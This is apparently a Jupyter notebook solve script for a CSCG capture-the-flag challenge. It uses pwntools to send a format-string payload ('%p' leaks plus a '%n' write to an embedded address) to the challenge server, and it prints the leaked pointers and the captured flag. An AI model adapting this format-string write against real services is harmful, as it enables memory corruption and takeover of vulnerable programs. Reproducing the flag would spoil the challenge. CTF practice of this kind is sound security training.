# %%
from pwn import *

# %%
payload = b"%p%p%p%p%p%p%p%n\x6C\x40\x40"

# %%
session = remote('d73d650503e7dd60f3fc824d-1024-intro-pwn-2.challenge.cscg.live', 1337, ssl=True)
# Out:
# [x] Opening connection to d73d650503e7dd60f3fc824d-1024-intro-pwn-2.challenge.cscg.live on port 1337
# [x] Opening connection to d73d650503e7dd60f3fc824d-1024-intro-pwn-2.challenge.cscg.live on port 1337: Trying 147.75.204.231
# [+] Opening connection to d73d650503e7dd60f3fc824d-1024-intro-pwn-2.challenge.cscg.live on port 1337: Done

# %%
session.recvline()
session.sendline(payload)

# %%
try:
    while True:
        print(session.recvline(keepends=False).decode())
except EOFError:
    pass
# Out:
# b'Thank you 0x7ffceda88420(nil)(nil)(nil)0x7f9761ba16800x70257025702570250x6e25702570257025l@@!\n'
# [!] EOFError during recvline. Returning buffered data without trailing newline.
# b'Oh, you got here somehow, you must have triggered a bug.. Here is the flag: CSCG{f0rm4t_5tr1ng_p0w3r_d15pl4y3d}'
# ---------------------------------------------------------------------------
# EOFError                                  Traceback (most recent call last)
# Cell In[12], line 2
#       1 while True:
# ----> 2     print(session.recvline())
#
# File /projects/ctfs/.venv/lib/python3.10/site-packages/pwnlib/tubes/tube.py:527, in tube.recvline(self, keepends, timeout)
#     465 r"""recvline(keepends=True, timeout=default) -> bytes
#     466
#     467 Receive a single line from the tube.
#    (...)
#     524     EOFError
#     525 """
#     526 try:
# --> 527     return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
#     528 except EOFError:
# ...
